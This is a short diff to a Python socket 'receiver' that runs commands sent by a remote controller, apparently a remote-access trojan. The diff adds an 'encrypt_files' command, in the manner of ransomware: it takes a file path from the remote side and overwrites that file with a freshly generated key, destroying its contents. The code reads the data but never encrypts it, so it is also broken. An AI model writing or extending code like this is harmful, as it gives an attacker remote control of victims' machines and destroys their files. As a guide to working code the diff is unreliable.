@@ -32,6 +32,15 @@ def receiver():
             files = os.getcwd()
             s.send(files.encode())
             print("command has been executed")
+        
+        elif command == "encrypt_files":
+            key = Fernet.generate_key()
+            path_to_encrypt = s.recv(2048)
+            with open(path_to_encrypt, "rb") as f:
+                data = f.read()
+            
+            with open(path_to_encrypt, "wb") as f:
+                f.write(key)
 
         elif command == "sysinfo":
             system = platform.system()
